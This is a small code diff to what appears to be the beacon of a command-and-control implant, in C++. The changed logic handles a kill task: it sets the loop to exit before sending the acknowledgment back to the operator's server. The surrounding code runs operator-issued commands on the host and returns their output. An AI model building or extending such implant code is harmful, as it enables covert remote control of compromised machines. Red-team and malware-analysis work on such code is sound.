@@ -1476,12 +1476,10 @@ extern "C" void beacon_main(int argc, char** argv) {
                 std::string output = run_task_with_timeout(task.command, cfg_owner, budget_ms);
                 if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                     if (output[2] == 'E' && output[3] == 'X') {
-                        // Exit acknowledgment (best effort): the server acks
-                        // the kill task and marks the beacon "exited" so the
-                        // operator does not see a stale ACTIVE entry. A dead
-                        // link must not keep the implant alive — exit anyway.
-                        net::send_result(cfg, task.task_id, output);
                         alive = false;
+                        // Ack the kill so the task does not stay queued; a
+                        // dead link must not keep the implant alive.
+                        net::send_result(cfg, task.task_id, output);
                         break;
                     }
                     if (output[2] == 'M' && output[3] == 'G') {
